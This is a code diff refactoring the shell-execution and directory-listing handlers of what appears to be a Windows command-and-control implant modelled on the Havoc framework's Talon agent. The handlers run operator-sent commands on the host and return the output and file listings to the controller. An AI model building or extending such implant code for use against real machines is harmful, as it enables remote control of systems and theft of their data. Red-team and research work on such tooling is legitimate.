@@ -38,11 +38,8 @@ void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
   if (argc < 1) return;
   struct TLVBuild out = allocStruct(50);
 
-  int cmdSize = extractInt32(tlv);
-  char * cmd = malloc(cmdSize + 1);
-  extractBytes(tlv, cmdSize, cmd);
-  cmd[cmdSize] = 0x00;
-  printf("[cmd] executing: %s\n", cmd);
+  char * cmd;
+  extractAllocString(tlv, &cmd);
 
   /**
    * https://github.com/HavocFramework/Talon/blob/main/Agent/Source/Command.c
@@ -108,7 +105,7 @@ void shellCmd(int taskId, int argc, struct TLVBuild * tlv) {
   LocalFree(pOutputBuffer);
   pOutputBuffer = NULL;
 
-  sendData(taskId, "output", "", out.bufsize, out.buf);
+  sendOutput(taskId, out);
 
   CloseHandle(hStdOutPipeRead);
   CloseHandle(hStdInPipeWrite);
@@ -169,20 +166,12 @@ void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
   
   WIN32_FIND_DATA fdFile;
   HANDLE hFile;
-
-  char * path;
-  int pathSize;
-
-  if (argc > 0) {
-    pathSize = extractInt32(tlv);
-    path = malloc(pathSize + 1);
-    extractBytes(tlv, pathSize, path);
-    path[pathSize] = 0x00;
-  } else {
-    path = ".\\*";
-  }
-
+  
   int files = 0;
+  char * path;
+
+  if (argc > 0) extractAllocString(tlv, &path);
+  else path = ".\\*";
   
   if (hFile = FindFirstFile(path, &fdFile)) {
 
@@ -200,13 +189,7 @@ void fsDirCmd(int taskId, int argc, struct TLVBuild * tlv) {
   addInt32(&response, files);
   addBytes(&response, false, file_list.bufsize, file_list.buf);
 
-  sendData(
-    taskId,
-    "output",
-    "",
-    response.bufsize, 
-    response.buf
-  );
+  sendOutput(taskId, response);
 
   free(response.buf);
   free(file_list.buf);
